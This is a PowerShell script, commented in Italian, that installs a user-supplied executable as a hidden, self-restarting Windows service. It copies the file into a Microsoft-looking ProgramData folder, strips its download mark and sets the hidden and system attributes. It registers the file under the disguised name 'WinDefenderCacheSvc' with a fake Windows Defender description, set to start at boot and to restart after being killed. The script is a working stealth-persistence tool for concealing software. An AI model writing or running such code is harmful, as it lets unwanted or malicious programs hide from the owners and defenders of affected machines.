$exePath = Read-Host "Inserite il path dell'exe"
$serviceName = "WinDefenderCacheSvc" # Nome discreto per il servizio
$displayDesc = "Gestore cache per la telemetria di Windows Defender"

# 1. Preparazione e Pulizia Metadati (come prima)
$exeName = Split-Path $exePath -Leaf
$destDir = "$env:ProgramData\Microsoft\Windows\DeviceMetadataStore"
$destFile = Join-Path $destDir $exeName

if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
Copy-Item -Path $exePath -Destination $destFile -Force
Unblock-File -Path $destFile
(Get-Item $destFile).Attributes = 'Hidden', 'System'

# 2. Creazione del Servizio di Windows
# -StartupType Automatic: si avvia al boot
# -Credential "LocalSystem": gira con i massimi privilegi
if (Get-Service $serviceName -ErrorAction SilentlyContinue) {
    Remove-Service -Name $serviceName -Confirm:$false
}

New-Service -Name $serviceName `
            -BinaryPathName $destFile `
            -DisplayName $serviceName `
            -Description $displayDesc `
            -StartupType Automatic

# 3. Configurazione Ripristino Automatico
# Se il processo viene chiuso, Windows lo riavvia dopo 1 minuto
sc.exe failure $serviceName reset= 86400 actions= restart/60000/restart/60000/restart/60000

# 4. Avvio immediato
Start-Service -Name $serviceName

Write-Host "[SISTEMA AGGIORNATO] Il servizio $serviceName è ora attivo, m'Lord." -ForegroundColor Cyan
